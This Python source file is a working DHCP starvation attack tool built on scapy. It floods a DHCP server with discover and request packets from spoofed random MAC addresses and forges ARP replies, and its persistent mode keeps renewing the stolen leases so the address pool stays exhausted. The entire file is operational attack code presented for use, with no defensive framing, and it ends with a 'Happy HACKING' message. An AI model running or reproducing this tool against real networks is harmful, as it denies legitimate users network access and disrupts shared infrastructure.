"""
Author: Gal Gabay
DHCP starvation attack tool
"""

import argparse
import codecs
from time import sleep

from colorama import Fore
from scapy.all import *
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether, ARP


def discover(src_mac, i_face):
    """
    Create and send a Discover packet from a faked mac address to the DHCP server
    :param src_mac: the faked-random source mac address
    :param i_face: the interface that the user wishes to use
    """
    discover_packet = (
            Ether(src=src_mac, dst='ff:ff:ff:ff:ff:ff', type=0x800) /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(op=1, chaddr=src_mac, xid=random.randint(1, 2 ** 32 - 1)) /
            DHCP(options=[("message-type", 1), "end"])
    )
    sendp(discover_packet, iface=i_face, verbose=False)


def request(iface, src_mac, dst_mac='ff:ff:ff:ff:ff:ff', src_ip='0.0.0.0', dst_ip='255.255.255.255', offered_ip=''):
    """
    Create and send a DHCPREQUEST packet from a faked mac address to the DHCP server
    :param iface: the interface that the user wishes to use
    :param src_mac: the faked-random source MAC address
    :param dst_mac: the destination MAC address - broadcast is default
    :param src_ip: the source IP address - '0.0.0.0' is default
    :param dst_ip: the destination IP address - broadcast is default
    :param offered_ip: offered IP for request after offer packet
    :return:
    """
    if offered_ip:
        # options for DHCPREQUEST as response to offer (SELECTING mode)
        dhcp_options = [("message-type", "request"),
                        ("requested_addr", offered_ip),
                        ("server_id", dst_ip),
                        ("hostname", 'gal'), "end"]
    else:
        # options for DHCPREQUEST for renew a lease (RENEWING mode)
        dhcp_options = [("message-type", "request"),
                        ("client_id", b'\x01' + codecs.decode(src_mac.replace(':', ''), 'hex')),
                        ("param_req_list", [1, 2, 6, 12, 15, 26, 28, 121, 3, 33, 40, 41, 42, 119, 249, 252, 17]),
                        ("max_dhcp_size", 65535),
                        ("hostname", 'gal'), "end"]
    # DHCPREQUEST packet creating
    req_packet = (
            Ether(src=src_mac, dst=dst_mac, type=0x800) /
            IP(src=src_ip, dst=dst_ip) /
            UDP(sport=68, dport=67) /
            BOOTP(ciaddr=src_ip, chaddr=codecs.decode(src_mac.replace(':', ''), 'hex'),
                  xid=random.randint(1, 2 ** 32 - 1)) /
            DHCP(options=dhcp_options)
    )
    # DHCPREQUEST packet sending
    if offered_ip:
        sendp(req_packet, iface=iface, verbose=False)
    else:
        p = srp1(req_packet, iface=iface, verbose=False) # return the DHCPACK - works only while RENEWING
        return p


def arp_reply(src_mac, src_ip, dst_mac, dst_ip, iface):
    """
    :param src_mac: the faked-random source MAC address
    :param src_ip: the source IP address
    :param dst_mac: the destination MAC address
    :param dst_ip: the destination IP address
    :param iface: the interface that the user wishes to use
    :return: DHCPACK packet (optional)
    """
    # ARP-REPLY packet sending
    # (when the user sends DHCPREQUEST, the DHCP server sends ARP-REQUEST to identify the source)
    reply = ARP(op=2, hwsrc=src_mac, psrc=src_ip, hwdst=dst_mac, pdst=dst_ip)
    # Sends the ARP-REPLY (is at message) about the src_mac
    send(reply, iface=iface, verbose=False)


def args_parser():
    """
    Parse the user's file args
    :return: parsed arguments
    """
    parser = argparse.ArgumentParser(description='DHCP Starvation attack tool')
    parser.add_argument('-p', '--persist', default=False, action='store_true', help='persistent?')
    parser.add_argument('-i', '--iface', metavar="IFACE", default=conf.iface, type=str,
                        help='Interface you wish to use')
    parser.add_argument('-t', '--target', metavar="TARGET", default=0, type=str, help='IP of target server')
    return parser.parse_args()


class DhcpStarvation:
    def __init__(self, persistent, target, iface):
        self.persistent = persistent
        self.target = target
        self.server_mac = ''
        self.iface = iface
        self.leased_ips = {}
        self.first_time = True

    def starve(self):
        """
            Apply a DHCP starvation using DHCP Discovers and request
        """
        # initialize a timer thread for persistent mode (searching for new IP addresses every 30 seconds)
        th = threading.Timer(30.0, self.starve)
        th.start()  # start the thread
        print("Check for new IP addresses...")
        while True:
            counter = 0  # counter for DHCPDISCOVER limit without DHCPOFFER (3)
            src_mac = str(RandMAC())  # rand a source MAC
            discover(src_mac, self.iface)  # create and send DHCPDISCOVER
            while True:
                p = sniff(count=1, filter="udp and (port 67 or 68)", timeout=3)  # sniff a DHCPOFFER packet
                if len(p) and DHCP in p[0] and p[0][DHCP].options[0][1] == 2:  # if it's an DHCPOFFER packet
                    break
                counter += 1
                if counter == 3:
                    if self.persistent and self.first_time:
                        print("Move to persistent mode...")
                        self.persistent_starve()  # start to starve in persistent mode
                    elif self.persistent and not self.first_time:
                        print("Back to persistent mode...")
                        return
                    else:
                        print(f"{Fore.GREEN}DHCP starvation done successfully\nHappy HACKING{Fore.RESET}")
                        th.cancel()  # turn off the persistent thread
                        return
                discover(src_mac,
                         self.iface)  # if the is no offer and counter<3 - try to send DHCPDISCOVER packet again
            # preparing for DHCPREQUEST packet sending
            self.server_mac = p[0][Ether].src
            self.target = self.target if self.target else p[0][IP].src
            offered_ip = p[0][IP].dst
            # creating and sending DHCPREQUEST packet as a response to DHCPOFFER
            request(self.iface, src_mac, offered_ip=offered_ip)
            print(f"Request sent for {Fore.GREEN}{offered_ip}{Fore.RESET} offered ip address")
            # ARP-REPLY sending as response to ARP-REQUEST of the DHCP server
            arp_reply(src_mac=src_mac, src_ip=offered_ip, dst_mac=self.server_mac, dst_ip=self.target, iface=self.iface)
            # getting the lease-time of the new IP
            offer_options = dict([t for t in p[0][DHCP].options if isinstance(t, tuple)])
            lease_time = offer_options['lease_time']
            self.leased_ips[offered_ip] = [src_mac, lease_time, time.time()]  # update dictionary (for persistent mode)

    def persistent_starve(self):
        """
        Persistent mode starvation - send request for lease renewal if 50% of the leased period passed
        """
        self.first_time = False
        lock = threading.Lock()
        with lock:
            while True:
                for ip, details in self.leased_ips.copy().items():
                    mac, lease_time, lease_start = details
                    # if T1 expires (50% of lease-time) send a uni-cast DHCPREQUEST
                    if 0.875 * lease_time > time.time() - lease_start > 0.5 * lease_time:
                        p = request(self.iface, mac, self.server_mac, ip, self.target)
                        arp_reply(mac, ip, self.server_mac, self.target, self.iface)
                        if p and DHCP in p and p[DHCP].options[0][1] == 5:  # if it's an DHCPACK packet
                            self.leased_ips[ip][2] = time.time()
                            print(f"Request for {Fore.GREEN}{ip}{Fore.RESET} lease renewal approved")
                            break
                        sleep(0.01)
                    # if T2 expires (87.5% of lease-time) send a broadcast DHCPREQUEST
                    elif lease_time > time.time() - lease_start > 0.875 * lease_time:
                        p = request(self.iface, src_mac=mac, src_ip=ip)
                        arp_reply(mac, ip, self.server_mac, self.target, self.iface)
                        if p and DHCP in p and p[DHCP].options[0][1] == 5:  # if it's an DHCPACK packet
                            self.leased_ips[ip][2] = time.time()
                            print(f"Request for {Fore.GREEN}{ip}{Fore.RESET} lease renewal approved")
                            break
                        sleep(0.01)


def main():
    args = args_parser()
    if args.iface not in get_if_list(): # if the user input interface isn't found
        print(f'{Fore.RED}Interface not found !{Fore.RESET}\nPlease use one of the below interfaces:')
        print('\n'.join(get_if_list()))
        return
    dhcp_starving = DhcpStarvation(persistent=args.persist, target=args.target, iface=args.iface)
    dhcp_starving.starve()


if __name__ == "__main__":
    main()
